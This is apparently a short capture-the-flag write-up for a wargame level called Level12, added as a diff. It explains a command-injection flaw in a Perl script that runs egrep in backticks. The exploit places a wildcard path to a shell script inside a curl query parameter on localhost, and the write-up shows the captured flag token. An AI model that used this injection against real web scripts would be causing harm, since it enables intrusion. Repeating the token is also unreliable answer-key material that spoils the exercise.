@@ -1,0 +1,14 @@
+we can see that in home directory of  Level12 there is file named level12.pl
+
+the script take 2 argument x and y and change lower case to upper case and delete anything after whitespace in argument 1 and run it in `egrep "^$xx" /tmp/xd 2>&1`;
+so we are going to create a script that cointain:
+
+$> cat SCRIPT.SH
+#!/bin/bash
+getflag >/tmp/pass
+
+
+$>curl 'localhost:4646?x=`/*/SCRIPT.SH`'
+
+$>cat pass
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
